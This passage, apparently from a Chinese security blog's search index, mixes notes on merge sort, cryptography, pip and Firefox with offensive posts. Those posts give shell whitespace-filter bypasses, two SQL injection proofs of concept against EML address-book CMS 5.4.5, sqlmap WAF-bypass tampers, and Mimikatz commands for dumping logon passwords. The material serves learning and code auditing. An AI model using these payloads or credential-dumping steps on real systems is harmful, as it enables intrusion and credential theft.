class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">mergeSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> high = arr.length - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tmergeSort(arr, low, high);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">mergeSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> high)</span> </span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(low&lt;high) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> mid = (low + high) / <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//对左边的数组进行递归排序</span></span><br><span class=\"line\">\t\t\tmergeSort(arr, low, mid);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//对右边的数组进行递归排序</span></span><br><span class=\"line\">\t\t\tmergeSort(arr, mid+<span class=\"number\">1</span>, high);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//合并两个已排序的数组</span></span><br><span class=\"line\">\t\t\tmergeArr(arr, low, mid, high);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">mergeArr</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> mid, <span class=\"keyword\">int</span> high)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] temp = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[high - low + <span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = low;<span class=\"comment\">// 左指针</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> j = mid + <span class=\"number\">1</span>;<span class=\"comment\">// 右指针</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> k = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 把较小的数先移到新数组中</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i &lt;= mid &amp;&amp; j &lt;= high) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (arr[i] &lt; arr[j]) &#123;</span><br><span class=\"line\">                temp[k++] = arr[i++];</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                temp[k++] = arr[j++];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 把左边剩余的数移入数组</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i &lt;= mid) &#123;</span><br><span class=\"line\">            temp[k++] = arr[i++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 把右边边剩余的数移入数组</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (j &lt;= high) &#123;</span><br><span class=\"line\">            temp[k++] = arr[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 把新数组中的数覆盖arr组</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> k2 = <span class=\"number\">0</span>; k2 &lt; temp.length; k2++) &#123;</span><br><span class=\"line\">            arr[k2 + low] = temp[k2];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"对比\"><a href=\"#对比\" class=\"headerlink\" title=\"对比\"></a>对比</h3><p><img src=\"/images/sort/排序总结.jpg\" alt=\"排序总结\"></p>\n","categories":[],"tags":["算法"]},{"title":"密码学基础笔记(一)","url":"http://b1ng0.top/2019/01/26/密码学基础笔记(一)/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>看到第一学期开了密码学这门课，本来想好好学一下的，没想到计划赶不上变化居然忙到根本没有时间上课，希望不会挂掉（哭。。。</p>\n<h2 id=\"第一章-概览\"><a href=\"#第一章-概览\" class=\"headerlink\" title=\"第一章 概览\"></a>第一章 概览</h2><h3 id=\"计算机安全概念\"><a href=\"#计算机安全概念\" class=\"headerlink\" title=\"计算机安全概念\"></a>计算机安全概念</h3><p>定义：</p>\n<blockquote>\n<p>“对于一个自动化的信息系统，采取保护措施确保信息系统资源（包括硬件、软件、固件、信息/数据和通信）的保密性、完整性、可用性。”</p>\n</blockquote>\n<p>3个关键目标（CIA）：</p>\n<ul>\n<li>保密性（Confidentiality）<ul>\n<li>数据保密性</li>\n<li>隐私性</li>\n</ul>\n</li>\n<li>完整性（Integrity）<ul>\n<li>数据完整性</li>\n<li>系统完整性</li>\n</ul>\n</li>\n<li>可用性（Availability）</li>\n</ul>\n<p>其他概念：</p>\n<ul>\n<li>真实性（Authenticity）</li>\n<li>可追溯性（Accountability）</li>\n</ul>\n<h3 id=\"OSI安全框架\"><a href=\"#OSI安全框架\" class=\"headerlink\" title=\"OSI安全框架\"></a>OSI安全框架</h3><p>主要关注：</p>\n<ul>\n<li><p>安全攻击</p>\n<ul>\n<li>被动攻击<ul>\n<li>信息内容的泄露</li>\n<li>流量分析</li>\n</ul>\n</li>\n<li>主动攻击<ul>\n<li>伪装</li>\n<li>重播</li>\n<li>消息修改</li>\n<li>拒绝服务</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>安全机制<ul>\n<li>特定安全机制：加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制、公证。</li>\n<li>普遍安全机制：可信功能、安全标签、事件检测、安全审计跟踪、安全恢复。</li>\n</ul>\n</li>\n<li>安全服务<ul>\n<li>认证</li>\n<li>访问控制</li>\n<li>数据保密性</li>\n<li>数据完整性</li>\n<li>不可否认性</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>是一种由系统提供的对系统资源进行特殊保护的处理或通信服务。(RFC4949)</p>\n</blockquote>\n<h3 id=\"网络安全模型\"><a href=\"#网络安全模型\" class=\"headerlink\" title=\"网络安全模型\"></a>网络安全模型</h3><p><img src=\"/images/网络安全模型.png\" alt></p>\n<p>可信第三方：</p>\n<ul>\n<li>第三方负责将秘密信息分配给通信双方，而对攻击者保密。</li>\n<li>或者当通信双方关于信息传输的真实性发生争执时，由第三方来仲裁。</li>\n</ul>\n<p>安全服务：</p>\n<ol>\n<li>设计算法</li>\n<li>产生秘密信息</li>\n<li>分配和共享</li>\n<li>指明协议实现安全服务</li>\n</ol>\n<h2 id=\"第二章-传统加密技术\"><a href=\"#第二章-传统加密技术\" class=\"headerlink\" title=\"第二章 传统加密技术\"></a>第二章 传统加密技术</h2><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><ul>\n<li><p>密码学</p>\n<ul>\n<li>密码编码学</li>\n<li>密码分析学</li>\n</ul>\n</li>\n<li><p>明文：原始的消息</p>\n</li>\n<li>密文： 加密后的消息</li>\n<li>加密：从明文到密文的变换过程</li>\n<li>解密：从密文到明文的变换过程</li>\n</ul>\n<h3 id=\"对称密码模型\"><a href=\"#对称密码模型\" class=\"headerlink\" title=\"对称密码模型\"></a>对称密码模型</h3><p>5个基本成分：</p>\n<ul>\n<li>明文</li>\n<li>加密算法</li>\n<li>密钥</li>\n<li>密文</li>\n<li>解密算法</li>\n</ul>\n<p><img src=\"/images/对称密码模型.png\" alt>     </p>\n<ul>\n<li><p>加密算法根据输入信息X和密钥K生成密文Y=[Y1, Y2, …, YN]，即Y=E[K, X]。</p>\n</li>\n<li><p>有密钥K的合法接收者，可进行解密变换X=D[K, Y]。</p>\n</li>\n</ul>\n<p><img src=\"/images/对称密码体制.png\" alt></p>\n<h3 id=\"密码编码学\"><a href=\"#密码编码学\" class=\"headerlink\" title=\"密码编码学\"></a>密码编码学</h3><p>3个独立特征：</p>\n<ol>\n<li>转换明文为密文的运算类型：代替 vs. 置换。</li>\n<li>所用的密钥数：对称密码 vs. 公钥密码。</li>\n<li>处理明文的方法：分组密码 vs. 流密码。</li>\n</ol>\n<h3 id=\"密码分析学和穷举攻击\"><a href=\"#密码分析学和穷举攻击\" class=\"headerlink\" title=\"密码分析学和穷举攻击\"></a>密码分析学和穷举攻击</h3><p>攻击通用方法：</p>\n<ul>\n<li>密码分析学</li>\n<li>穷举攻击</li>\n</ul>\n<blockquote>\n<p>Kerckhoffs原则：假定密码攻击者知道加密数据所使用的算法，数据的安全性应当取决于密钥的选择。</p>\n</blockquote>\n<blockquote>\n<p>​    <strong>无条件安全</strong>：无论花多少时间，攻击者都无法解密密文。</p>\n<p>​    Shannon已经证明：除了一次一密之外，所有的加密算法都不会是无条件安全的。</p>\n</blockquote>\n<p>加密算法应尽量满足：</p>\n<ul>\n<li><p>破译密码的<strong>代价</strong>超出密文信息的价值</p>\n</li>\n<li><p>破译密码的<strong>时间</strong>超出密文信息的有效生命期</p>\n</li>\n</ul>\n<p>如果加密体制满足了上述两条标准中的任意一条，则它是<strong>计算安全</strong>的。然而，估计攻击者成功破译密文所需的工作量是非常困难的。</p>\n<h3 id=\"代替技术\"><a href=\"#代替技术\" class=\"headerlink\" title=\"代替技术\"></a>代替技术</h3><p><strong>Caesar密码</strong>：</p>\n<blockquote>\n<p>对字母表中的每个字母，用它之后的第3个字母来代替</p>\n</blockquote>\n<p>细节：</p>\n<ol>\n<li>加密算法：Ek(m) ≡ m + 3 (mod 26)</li>\n<li>解密算法：Dk(c) ≡ c - 3 (mod 26)</li>\n</ol>\n<blockquote>\n<p>凯撒密码的密钥空间太小，穷举攻击25种可能</p>\n</blockquote>\n<p><strong>单表代替密码</strong>：</p>\n<blockquote>\n<p>Caesar密码只有25种可能的密钥，是不安全的。通过允许任意代替，密钥空间将会急剧增大。一般，具有n个元素的集合有n!个置换。如果密文是26个字母的任意置换，那么就有26!种可能的密钥。</p>\n</blockquote>\n<p><strong>Playfair密码</strong>：</p>\n<p>基于一个5×5的字母矩阵。字母矩阵构造方法如下：</p>\n<ol>\n<li>选一个英文短语或单词作为密钥，去掉其中重复的字母得到一个无重复字母的字符串。</li>\n<li>然后再将字母表中剩下的字母依次从左到右、从上往下填入矩阵中，字母i，j占同一个位置。</li>\n</ol>\n","categories":[],"tags":["密码学"]},{"title":"Blank Bypass","url":"http://b1ng0.top/2018/11/15/Blank Bypass/","content":"<ol>\n<li><p>cat&lt;1.txt</p>\n<p><img src=\"/images/black1.PNG\" alt></p>\n</li>\n<li><p>cat$IFS$91.txt</p>\n<p><img src=\"/images/black2.PNG\" alt></p>\n</li>\n<li><p>cat${IFS}1.txt</p>\n<p><img src=\"/images/black3.PNG\" alt></p>\n</li>\n<li><p>cat&lt;&gt;1.txt</p>\n<p><img src=\"/images/black4.PNG\" alt></p>\n</li>\n<li><p>{cat,1.txt}</p>\n<p><img src=\"/images/black5.PNG\" alt></p>\n</li>\n<li><p>CMD=$’\\x201.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black6.PNG\" alt></p>\n</li>\n<li><p>CMD=$’\\x0a1.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black7.PNG\" alt></p>\n</li>\n<li><p>CMD=$’\\x091.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black8.PNG\" alt></p>\n</li>\n</ol>\n","categories":[],"tags":["linux"]},{"title":"EML企业通讯录管理系统两处注入分析","url":"http://b1ng0.top/2018/08/12/EML企业通讯录管理系统两处注入分析/","content":"<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。</p>\n<h1 id=\"0x01-漏洞环境\"><a href=\"#0x01-漏洞环境\" class=\"headerlink\" title=\"0x01 漏洞环境\"></a>0x01 漏洞环境</h1><p>CMS：EML企业通讯录管理系统</p>\n<p>版本：5.4.5</p>\n<p>官方网站：<a href=\"http://bbs.emlsoft.com\" target=\"_blank\" rel=\"noopener\">http://bbs.emlsoft.com</a> </p>\n<p>更新时间：2018.7.26 </p>\n<p>测试环境：windows10+phpstudy+php5.5</p>\n<h1 id=\"0x02-漏洞分析\"><a href=\"#0x02-漏洞分析\" class=\"headerlink\" title=\"0x02 漏洞分析\"></a>0x02 漏洞分析</h1><h3 id=\"过滤函数：\"><a href=\"#过滤函数：\" class=\"headerlink\" title=\"过滤函数：\"></a>过滤函数：</h3><p>对于小cms的sql注入的审计，一般存在两个方向：</p>\n<ol>\n<li>系统过滤机制的正面bypass;</li>\n<li>过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入、二次入库的注入以及忘记过滤的地方等.);</li>\n</ol>\n<p>当然，后者出现的概率更大并且也更好挖一点，先来看看过滤函数：</p>\n<p>/lib/func.class.php:(27-37行)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//安全验证</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_RunMagicQuotes</span><span class=\"params\">(&amp;$svar)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!get_magic_quotes_gpc())\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>( is_array($svar) )&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">foreach</span>($svar <span class=\"keyword\">as</span> $k =&gt; $v) $svar[$k] = _RunMagicQuotes($v);</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t$svar = addslashes($svar);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $svar;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。</p>\n<h3 id=\"第一处注入：\"><a href=\"#第一处注入：\" class=\"headerlink\" title=\"第一处注入：\"></a>第一处注入：</h3><p>action/action.address.php：（60-68行）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">//设置分页</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST[numPerPage]==<span class=\"string\">\"\"</span>)&#123;$numPerPage=<span class=\"string\">\"10\"</span>;&#125;<span class=\"keyword\">else</span>&#123;$numPerPage=$_POST[numPerPage];&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[pageNum]==<span class=\"string\">\"\"</span>||$_GET[pageNum]==<span class=\"string\">\"0\"</span> )&#123;$pageNum=<span class=\"string\">\"0\"</span>;&#125;<span class=\"keyword\">else</span>&#123;$pageNum=($_GET[pageNum]<span class=\"number\">-1</span>)*$numPerPage;&#125;</span><br><span class=\"line\">$num=mysql_query(<span class=\"string\">\"select * from eml_address_list where 1=1 $search\"</span>);<span class=\"comment\">//当前频道条数</span></span><br><span class=\"line\">$total=mysql_num_rows($num);<span class=\"comment\">//总条数\t</span></span><br><span class=\"line\">$page=<span class=\"keyword\">new</span> page(<span class=\"keyword\">array</span>(<span class=\"string\">'total'</span>=&gt;$total,<span class=\"string\">'perpage'</span>=&gt;$numPerPage));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//查询</span></span><br><span class=\"line\">$sql=<span class=\"string\">\"select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage\"</span>;</span><br></pre></td></tr></table></figure>\n<p>$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：<code>（$pageNum=($_GET[pageNum]-1)*$numPerPage;）</code></p>\n<p>后者位于limit中并且存在order by，(<a href=\"http://www.freebuf.com/articles/web/57528.html\" target=\"_blank\" rel=\"noopener\">参考文章</a>)可使用如下利用方式。</p>\n<p>POC：</p>\n<p><code>numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);</code></p>\n<p><img src=\"/images/sqli1.PNG\" alt></p>\n<h3 id=\"第二处注入：\"><a href=\"#第二处注入：\" class=\"headerlink\" title=\"第二处注入：\"></a>第二处注入：</h3><p>action/action.address.php：（186-206行)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//批量删除</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($do==<span class=\"string\">\"del_all\"</span>)&#123;</span><br><span class=\"line\">\tIf_rabc($action,$do); <span class=\"comment\">//检测权限</span></span><br><span class=\"line\">\tis_admin($action,$do); <span class=\"comment\">//检测权限</span></span><br><span class=\"line\">\t$arr = $_POST[<span class=\"string\">\"item\"</span>];</span><br><span class=\"line\">\t$count_arr=count($arr); </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($count_arr==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> error($msg); </span><br><span class=\"line\">\t<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$str = implode(<span class=\"string\">\"','\"</span>,$arr);<span class=\"comment\">//拼接字符</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t$sql = <span class=\"string\">\"delete from eml_address_list WHERE id in('&#123;$str&#125;')\"</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($db-&gt;query($sql))&#123;<span class=\"keyword\">echo</span> success($msg,<span class=\"string\">\"?action=address\"</span>);&#125;<span class=\"keyword\">else</span>&#123;<span class=\"keyword\">echo</span> error($msg);&#125;</span><br></pre></td></tr></table></figure>\n<p>item参数通过POST方法传入，使用implode函数进行数组=&gt;字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻。</p>\n<p>POC:</p>\n<p><code>item[]=2&#39;) or updatexml(1,concat(0x7e,(version())),0) -- dd</code></p>\n<p><img src=\"/images/sqli2.PNG\" alt></p>\n<h1 id=\"0x03-总结\"><a href=\"#0x03-总结\" class=\"headerlink\" title=\"0x03 总结\"></a>0x03 总结</h1><p>感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 </p>\n","categories":[],"tags":["代码审计"]},{"title":"Socks5_proxy","url":"http://b1ng0.top/2018/05/21/Socks5_proxy/","content":"<h1 id=\"Info：\"><a href=\"#Info：\" class=\"headerlink\" title=\"Info：\"></a>Info：</h1><p>毕业设计做出这么个东西，也是蛮水的。。。    </p>\n<h1 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage:\"></a>Usage:</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python Socks5_proxy.py       -- run on 1080</span><br><span class=\"line\">python Socks5_proxy.py 2333  -- run on 2333</span><br></pre></td></tr></table></figure>\n<h1 id=\"Test\"><a href=\"#Test\" class=\"headerlink\" title=\"Test:\"></a>Test:</h1><p><img src=\"/images/test1.PNG\" alt></p>\n<p><img src=\"/images/test2.PNG\" alt></p>\n<h1 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference:\"></a>Reference:</h1><ul>\n<li><a href=\"https://github.com/felix021/ssocks5/blob/master/ssocks5.py\" target=\"_blank\" rel=\"noopener\">ssocks5</a></li>\n<li><a href=\"https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py\" target=\"_blank\" rel=\"noopener\">repocks</a></li>\n<li><a href=\"https://www.ietf.org/rfc/rfc1928.txt\" target=\"_blank\" rel=\"noopener\">rfc1928</a><h1 id=\"Download\"><a href=\"#Download\" class=\"headerlink\" title=\"Download:\"></a>Download:</h1></li>\n</ul>\n<p><a href=\"https://github.com/sun1024/Socks5_proxy\" target=\"_blank\" rel=\"noopener\">Socks5_proxy</a></p>\n","categories":[],"tags":[]},{"title":"Some Sqlmap Tricks","url":"http://b1ng0.top/2017/09/15/Some Sqlmap Tricks/","content":"<h2 id=\"0x01-–prefix-–suffix\"><a href=\"#0x01-–prefix-–suffix\" class=\"headerlink\" title=\"0x01 –prefix,–suffix\"></a>0x01 –prefix,–suffix</h2><p>在注入的payload的前面或者后面加一些字符, 使sql语句能正常拼接:</p>\n<p><code>--prefix &quot;xxx&quot; --suffix &quot;xxx&quot;</code></p>\n<h2 id=\"0x02-–start-–stop\"><a href=\"#0x02-–start-–stop\" class=\"headerlink\" title=\"0x02 –start –stop\"></a>0x02 –start –stop</h2><p>表中的数据量过多, 或者盲注太费时间, 使用–start,–stop指定几行数据:</p>\n<p><code>--start num1 --stop num2</code></p>\n<h2 id=\"0x03-–search\"><a href=\"#0x03-–search\" class=\"headerlink\" title=\"0x03 –search\"></a>0x03 –search</h2><p>寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段:</p>\n<p><code>--search -C sfzh</code></p>\n<h2 id=\"0x04-–count\"><a href=\"#0x04-–count\" class=\"headerlink\" title=\"0x04 –count\"></a>0x04 –count</h2><p>只获取表中的数据个数:</p>\n<p><code>--count -D testDB</code></p>\n<h2 id=\"0x05-一些tamper\"><a href=\"#0x05-一些tamper\" class=\"headerlink\" title=\"0x05 一些tamper\"></a>0x05 一些tamper</h2><p>如果web应用使用asp/asp.net开发，charunicodeencode.py和percentage.py可以绕过Waf。</p>\n<p><code>--tamepr=charunicodeencode</code><br><code>--tamepr=percentage</code></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"http://119.29.64.123:8080/WooyunDrops/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C\" target=\"_blank\" rel=\"noopener\">sqlmap用户手册</a><br><a href=\"http://www.freebuf.com/articles/1000.html\" target=\"_blank\" rel=\"noopener\">如何使用SQLMap绕过WAF</a></p>\n","categories":[],"tags":["Sqlmap"]},{"title":"Mimikatz简单使用（备忘）","url":"http://b1ng0.top/2017/04/28/Mimikatz简单使用（备忘）/","content":"<ul>\n<li>下载地址：<br><a href=\"https://github.com/gentilkiwi/mimikatz/releases/latest\" target=\"_blank\" rel=\"noopener\">Mimikatz</a></li>\n<li><p>简单使用：</p>\n<ul>\n<li>step1:<br>以管理员身份运行mimikatz.exe<br>(根据计算机系统选择相应版本)</li>\n<li><p>step2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\"></span><br><span class=\"line\">#提升权限</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>step3:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::logonpasswords</span><br><span class=\"line\"></span><br><span class=\"line\">#获取密码</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n","categories":[],"tags":["Mimikatz"]},{"title":"firefox更换中文语言包","url":"http://b1ng0.top/2017/04/17/firefox更换中文语言包/","content":"<p>记录一下，免得下次再去网上搜</p>\n<ul>\n<li>中文语言包下载地址：<br><code>http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/27.0.1/win32/xpi/zh-CN.xpi</code><br>(版本号:27.0.1/操作系统：win32)</li>\n<li><p>在FireFox地址栏里输入”about:config”。</p>\n</li>\n<li><p>然后在过滤器里输入general.useragent.locale，双击然后在弹出的对话框里输入”zh-CN”。</p>\n</li>\n<li><p>重启，更换成功。</p>\n</li>\n</ul>\n","categories":[],"tags":["firefox"]},{"title":"pip修改官方源踩的坑","url":"http://b1ng0.top/2017/03/29/pip修改官方源踩的坑/","content":"<h2 id=\"linux篇：\"><a href=\"#linux篇：\" class=\"headerlink\" title=\"linux篇：\"></a>linux篇：</h2><ul>\n<li>编辑配置文件（如果没有, 新建一份）：<br><code>vi ~/.pip/pip.conf</code></li>\n<li><p>在配置文件内加上（这里使用豆瓣源）:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[global]</span><br><span class=\"line\">index-url = http://pypi.douban.com/simple</span><br><span class=\"line\">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p>\n</li>\n</ul>\n<h2 id=\"windows篇（比较奇葩）：\"><a href=\"#windows篇（比较奇葩）：\" class=\"headerlink\" title=\"windows篇（比较奇葩）：\"></a>windows篇（比较奇葩）：</h2><ul>\n<li>新建文件（pip文件夹与pip.ini都要自己新建）：<br><code>C:\\Users\\用户名\\pip\\pip.ini</code><br>注意：不是C:\\Users\\用户名\\AppData\\Local\\pip下的 pip.ini</li>\n<li><p>在配置文件内加上（这里使用豆瓣源）:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[global]</span><br><span class=\"line\">index-url = http://pypi.douban.com/simple</span><br><span class=\"line\">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p>\n</li>\n</ul>\n<h2 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h2><p><a href=\"https://www.v2ex.com/t/291817\" target=\"_blank\" rel=\"noopener\">https://www.v2ex.com/t/291817</a><br><a href=\"https://ficapy.github.io/2013/12/27/pip_use_china_mirror/\" target=\"_blank\" rel=\"noopener\">https://ficapy.github.io/2013/12/27/pip_use_china_mirror/</a></p>\n","categories":[],"tags":["python"]},{"title":"sqlmap扩展tamper及其简单编写","url":"http://b1ng0.top/2017/03/22/sqlmap扩展tamper及其简单编写/","content":"<h2 id=\"常见tamper-搜集自网络-：\"><a href=\"#常见tamper-搜集自网络-：\" class=\"headerlink\" title=\"常见tamper(搜集自网络)：\"></a>常见tamper(搜集自网络)：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class=\"line\">apostrophenullencode.py 